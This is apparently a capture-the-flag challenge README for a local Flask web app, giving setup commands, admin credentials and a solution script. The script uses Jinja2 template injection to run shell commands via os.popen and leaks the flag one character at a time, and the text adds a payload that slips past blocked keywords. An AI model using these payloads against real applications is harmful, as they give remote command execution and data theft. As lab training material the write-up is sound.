# Docker
```
sudo docker build -t crispy-potato .
sudo docker run -p 5000:5000 -d crispy-potato
```
You should now be able to go to http://localhost:5000 and see the web app.

# Manual
```
pip3 install -r requirements.txt
python3 main.py
```

# Admin Creds
`admin:CodyFryIsGood!$`



Soln Script

```py
from os import popen
import string
import requests

SERVER_ADDR = "http://127.0.0.1:5000"

def get_cookie():
    data = {
        "username": "test", 
        "password": "test" 
    }

    req = requests.post(SERVER_ADDR+"/login", data=data)
    cookiejar = req.history[0].cookies
    cookie = cookiejar.get_dict()['session']

    return cookie

cookie = {"session": get_cookie()}

final = "Flag: RSA{"
while True:
    for x in string.printable:
        x = final + x
        payload = {'message':"{% if request.application.__globals__.__builtins__.__import__('os').popen('grep -io flag.*\} ./app/templates/admin.html').read().startswith('" + str(x) + "') %} found {% endif %}", 
        'username':'admin'}
        r = requests.post(url=SERVER_ADDR + "/messages", data=payload, cookies=cookie)
        if 'found' in r.text:
            final = x
            print(final)
            break
        else:
            pass
```

{{ }} , config these keywords are blocked

so our payload should be something like this :

```
{% if request.application.__globals__.__builtins__.__import__('os').popen('ls').read().startswith('D') %} worked {% endif %}
```
